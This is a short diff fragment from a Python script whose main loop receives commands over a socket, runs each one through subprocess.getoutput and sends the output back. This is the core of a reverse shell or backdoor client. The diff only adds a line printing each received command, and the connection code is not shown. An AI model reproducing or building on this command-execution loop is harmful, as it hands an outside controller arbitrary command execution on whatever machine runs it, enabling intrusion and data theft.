@@ -20,6 +20,7 @@ def main():
         command = s.recv(BUFFER).decode()
         if command.lower() == "exit":
             break
+        print(command)
         output = subprocess.getoutput(command)
         s.send(output.encode())
         new_info = s.recv(BUFFER).decode()
